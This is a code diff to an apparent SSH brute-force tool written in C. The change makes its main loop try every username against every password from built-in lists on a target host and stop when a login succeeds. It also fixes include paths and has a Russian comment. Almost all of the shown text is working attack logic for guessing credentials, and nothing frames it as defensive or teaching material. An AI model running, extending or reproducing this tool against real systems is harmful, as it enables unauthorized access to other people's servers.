@@ -1,5 +1,5 @@
-#include "../include/includes.h"
-#include "../bruteforce_functions/passwords.c"
+#include "include/includes.h"
+#include "bruteforce_functions/passwords.c"
 
 int try_login(const char *host, const char *user, const char *password) {
     ssh_session session = ssh_new();
@@ -36,11 +36,20 @@ int try_login(const char *host, const char *user, const char *password) {
 
 
 int ssh_brute() {
+    int shutup_ssh_bruteforce;
+
     for (int b = 0; usernames[b] != NULL; b++){
         for (int i = 0; passwords[i] != NULL; i++) {
-            if (try_login(HOST, user, passwords[i]) == 0) {
+            if (try_login(HOST, usernames[b], passwords[i]) == 0) {
+                shutup_ssh_bruteforce = 20;
                 break; // Если пароль найден, выходим из цикла
             }
         }
+
+        if (shutup_ssh_bruteforce == 20) {
+            shutup_ssh_bruteforce = 0;
+            break;
+        }
+
     }
 }
